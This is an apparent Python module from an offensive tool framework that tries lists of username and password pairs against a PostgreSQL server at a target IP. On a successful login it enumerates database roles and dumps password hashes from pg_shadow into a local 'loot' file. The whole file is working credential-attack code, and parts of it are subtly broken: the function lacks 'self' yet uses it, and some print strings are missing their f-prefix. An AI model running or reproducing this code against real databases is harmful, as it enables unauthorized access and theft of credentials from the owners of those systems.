import psycopg2
from hydra import Exploit
from util import Color

class postgresql(Exploit):
    def __init__(self):
        self.name = "postgres"
        self.port = 5432
    # def attack(self, ip_address):
    #     pass

    def getloot(ip_address, credentials):
        more_loot = []
        loot_dict = {}
        ip_address = str(ip_address)
        # go through each secure username
        for victim in credentials:
            username = victim[0]
            password = victim[1]
            print(f"{Color.BYLLW}Trying to connect to PostgreSQL with IP address {ip_address} " +
                  f"with:\n username {username} and password {password}{Color.END}",
                    file=self.output)

            # start the log in process
            try:
                trystr = "dbname=postgres host={} user={} password={}".format(ip_address, username, password)
                conn = psycopg2.connect(trystr)
            except psycopg2.OperationalError:
                print("{Color.BYLLW}Authentication failed.{Color.END}", file=self.output)
                continue

            # opens a cursor to perform psql ops    
            cur = conn.cursor()
        
            # enumerates all the usernames, the passwords are md5 hashed 
            # and only in viewable as root
            try:
                cur.execute("select * from pg_roles")
            except (psycopg2.OperationalError, psycopg2.InternalError) as e:
                continue
            # opening up returns
            print('{Color.BYLLW}Success. Gathering all usernames.{Color.END}', file=self.output)
            for l in cur.fetchall():
                # adds if the username is not already in there
                if loot_dict.get(l[0]) == None:
                    loot_dict[l[0]] = ""

            # tries to possibly get md5 hashes if in case it is a superuser
            try:
                cur.execute("select usename, passwd from pg_shadow")
                with open(f"./data/{ip_address}_postgresql_md5.txt", "w") as text_file:
                    for l in cur.fetchall():
                        text_file.write(l[1])
                print('{Color.BYLLW}Success. Gathering all md5 hashes.{Color.END}', file=self.output)
                        
            except psycopg2.ProgrammingError:
                print('{Color.BYLLW}No MD5 hashes found.{Color.END}', file=self.output)
                pass

        for k, v in loot_dict.items():
            more_loot.append((k,))

        return more_loot